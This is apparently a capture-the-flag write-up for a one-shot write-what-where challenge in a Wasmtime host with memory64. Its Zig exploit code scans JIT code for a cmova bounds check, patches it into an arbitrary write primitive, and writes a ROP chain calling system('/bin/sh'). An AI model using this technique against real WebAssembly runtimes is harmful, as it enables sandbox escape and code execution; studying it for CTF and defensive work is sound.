# Writeup

## Challenge summary

This is a classic write byte where challenge. You get one write to whatever address you would like (even read only addresses work).
The wbw function patches itself with ret instructions making it hard or impossible (i tested it) to use it multiple times.
The goal is to craft yourself a primitive with which you can do arbitrary writes to get a shell and read the flag.

The intended solution does that by patching away a bound check in wasm module jit code.

## Tooling

Enabling the memory64 proposal makes this challenge both easier and harder.

Harder because you need to use a compiler that support wasm64-freestanding/wasm64-unknown-unknown.
LLVM supports it so using clang, rustc, zig, etc. is 
Harder because wasm64-wasi is not a thing yet, so no wasi, no Input/Output.
Easier because you can index the whole memory space without any hassle.

To use wabt tools like `wasm2wat` or `wat2wasm` one has to use the `--enable-memory64` flag.

## Solution

### 1. Find memory offsets

With the inspect function one can inspect the memory of the wasm_host. And find all relevant mappings.

### 2. Craft yourself a write primitive

I am sure there are multiple avenues to get a usable write primitive for further exploitation.
The one the intended solution uses is to patch the generated code of our wasm module.
That can be a bit tricky, because offsets and instructions easily change when you change your wasm module.

The intended solution has a dummy write function `victim`.
Wasmtime does runtime bounds checks for all load and store instructions. With memory64, the code gen emits this `cmova` instruction that clears
the target register to 0 leading to a null deref if the address would be out of bounds.
The exploit works by searching for a certain marker and then the first `cmova` instruction.

```zig
noinline fn victim(addr: u64, val: u64) void {
    const write_addr: *u64 = @ptrFromInt(addr);
    _ = insp(addr); // dummy just to make the function a bit easier to spot
    write_addr.* = val;
}

const MARKER = 0x42424242;
fn find_victim(mem: MemLocations) i64 {
    var found_ourselfs = false;
    for (0..0x10000) |i| {
        const addr = mem.xgen + i;
        const val = insp(addr);
        if ((val & 0xffffffff) == MARKER) {
            found_ourselfs = true;
            continue;
        } else if (found_ourselfs and (val & 0xffff == 0x470f or val & 0xffff == 0x430f)) { // find cmova/cmovae
            if (val & 0xff0000 == 0) {
                // This is our own check
                continue;
            }
            return @intCast(addr);
        }
    }
    return 0;
}
```

### 3. ROP

This `cmova` instruction gets patched to use a different target register, making our `victim` function an arbitrary write primitive.
We are now able to write a ropchain to the stack and get a shell.

```zig
{
    ...
    victim(@intCast(rip_addr - module_offset), mem.libc + POP_RDI_OFFSET);
    victim(@intCast(rip_addr - module_offset + 8), mem.libc + BINSH_OFFSET);
    victim(@intCast(rip_addr - module_offset + 0x10), mem.libc + POP_RDI_OFFSET + 1); // ret for alignment
    victim(@intCast(rip_addr - module_offset + 0x18), mem.libc + SYSTEM_OFFSET);
}
```


